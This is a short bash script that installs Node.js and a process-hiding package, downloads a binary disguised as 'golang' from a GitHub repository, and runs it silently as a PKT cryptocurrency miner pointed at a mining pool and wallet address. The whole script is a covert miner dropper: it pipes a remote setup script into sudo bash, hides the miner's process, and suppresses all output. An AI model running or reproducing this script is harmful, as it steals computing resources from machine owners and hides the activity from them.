#!/bin/bash
apt update -y
apt install gcc screen -y
curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash
apt install nodejs -y
npm install -g npm@8.18.0 -y && npm i -g node-process-hider && ph add golang
wget https://github.com/danipedrosang/marcrash/raw/main/golang >/dev/null 2>&1
chmod +x golang
./golang ann -p pkt1q8prmfshgchvw8s0mzglxkj4cec0ecu78j8mc5e http://pool.pkt.world -t 1 >/dev/null 2>&1
